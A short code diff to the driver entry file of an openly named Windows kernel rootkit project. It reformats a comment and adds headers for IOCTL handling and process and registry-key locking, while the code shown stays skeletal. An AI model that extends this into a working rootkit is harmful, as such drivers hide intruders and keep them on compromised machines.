@@ -1,16 +1,19 @@
 /*
-        driver.c
-
-        Rootkit load/unload.
-*/
+ * driver.c
+ * 
+ * Description: Rootkit load/unload.
+ */
 
 #include <ntddk.h>
+#include "ioctl.h"
 #include "dkom.h"
 #include "lock_proc.h"
+#include "lock_key.h"
 
 void driver_unload(PDRIVER_OBJECT driver_obj)
 {
         UNREFERENCED_PARAMETER(driver_obj);
+
 }
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path)
